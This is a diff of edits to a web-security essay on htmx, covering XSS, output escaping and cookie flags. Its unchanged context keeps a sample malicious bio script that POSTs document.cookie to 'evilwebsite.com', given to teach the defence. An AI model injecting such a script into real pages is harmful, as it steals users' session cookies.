@@ -51,7 +51,7 @@ But this is not:
 
 The reason for this is simple: htmx inserts the response from that route directly into the user's page. If the response has a malicious `<script>` inside it, that script can steal the user's data. When you don't control the route, you cannot guarantee that whoever does control the route won't add a malicious script.
 
-Fortunately, this is a very easy rule to follow. Hypermedia APIs (i.e. HTML) are [specific to the layout of your application](https://htmx.org/essays/hypermedia-apis-vs-data-apis/), so there is almost never any reason you'd *want* to insert someone else's HTML into your page. All you have to do is make sure you only call your own routes.
+Fortunately, this is a very easy rule to follow. Hypermedia APIs (i.e. HTML) are [specific to the layout of your application](https://htmx.org/essays/hypermedia-apis-vs-data-apis/), so there is almost never any reason you'd *want* to insert someone else's HTML into your page. All you have to do is make sure you only call your own routes (htmx 2 will actually disable calling other domains by default).
 
 Though it's not quite as popular these days, a common SPA pattern was to separate the frontend and backend into different repositories, and sometimes even to serve them from different URLs. This would require using absolute URLs in the frontend, and often, [disabling CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS). With htmx (and, to be fair, modern React with NextJS) this is an anti-pattern.
 
@@ -82,7 +82,7 @@ The kind of vulnerability this prevents is often called a Cross-Site Scripting (
 For example, let's say you're building a dating site, and it lets users share a little bio about themselves. You'd render that bio like this, with `{{ user.bio }}` being the bio stored in the database:
 
 ```html
-<p class=bio>
+<p>
 {{ user.bio }}
 </p>
 ```
@@ -90,7 +90,7 @@ For example, let's say you're building a dating site, and it lets users share a 
 If a malicious user wrote a bio with a script element in it—like one that sends the client's cookie to another website—then this HTML will get sent to every user who views that bio:
 
 ```html
-<p class=bio>
+<p>
 <script>
   fetch('evilwebsite.com', { method: 'POST', body: document.cookie })
 </script>
@@ -125,7 +125,7 @@ export function escapeHtmlText (value) {
 This tiny JS function replaces `<` with `&lt;`, `"` with `&quot;`, and so on. These characters will still render properly as `<` and `"` when they're used in the text, but can't be interpreted as code constructs. The previous malicious bio will now be converted into the following HTML:
 
 ```html
-<p class=bio>
+<p>
 &lt;script&gt;
   fetch(&#x27;evilwebsite.com&#x27;, { method: &#x27;POST&#x27;, data: document.cookie })
 &lt;/script&gt;
@@ -215,7 +215,7 @@ So what do the options do?
 
 The first one, `Secure`, ensures that the browser will not send the cookie over an insecure HTTP connection, only a secure HTTPS connection. Sensitive info, like a user's login token, should *never* be sent over an insecure connection.
 
-The second option, `HttpOnly`, means that the browser will not expose to the cookie to JavaScript, ever (i.e. it won't be in [`document.cookie`](https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie)). Even if someone is able to insert a malicious script, like in the `evilwebsite.com` example above, that malicious script cannot access the user's cookie or send it to `evilwebsite.com`. The browser will only attach the cookie when the request is made to the website the cookie came from.
+The second option, `HttpOnly`, means that the browser will not expose the cookie to JavaScript, ever (i.e. it won't be in [`document.cookie`](https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie)). Even if someone is able to insert a malicious script, like in the `evilwebsite.com` example above, that malicious script cannot access the user's cookie or send it to `evilwebsite.com`. The browser will only attach the cookie when the request is made to the website the cookie came from.
 
 Finally, `SameSite=Lax` locks down an avenue for Cross-Site Request Forgery (CSRF) attacks, which is where an attacker tries to get the client's browser to make a malicious request to the `yourdomain.com` server—like a POST request. The `SameSite=Lax` setting tells the browser not to send the `yourdomain.com` cookie if the site that made the request isn't `yourdomain.com`—unless it's a straightforward `<a>` link navigating to your page. This is *mostly* browser default behavior now, but it's important to still set it directly.
 
@@ -223,7 +223,7 @@ In 2024, `SameSite=Lax` is [usually enough](https://security.stackexchange.com/q
 
 **Important Note:** `SameSite=Lax` only protects you at the domain level, not the subdomain level (i.e. `yourdomain.com`, not `yoursite.github.io`). If you're doing user login, you should always be doing that at your own domain in production. Sometimes the [Public Suffixes List](https://security.stackexchange.com/questions/223473/for-samesite-cookie-with-subdomains-what-are-considered-the-same-site) will protect you, but you shouldn't rely on that.
 
-## Breaking the Rules
+## Breaking the rules
 
 We started with the easiest, most secure practices—that way mistakes lead to a broken UX, which can be fixed, rather than stolen data, which cannot.
 
@@ -270,7 +270,7 @@ You can fix this in a couple of ways. The simplest, and safest, trick is to let 
 
 Yes, you're including unescaped content, but it's a link that you generated, so you know it's safe.
 
-You can handle custom CSS in the same way. Rather than let your users specific the color directly, give them some limited choices, and set the choices based on their input.
+You can handle custom CSS in the same way. Rather than let your users specify the color directly, give them some limited choices, and set the choices based on their input.
 
 ```css
 {% if user.favorite_color === 'red' %}
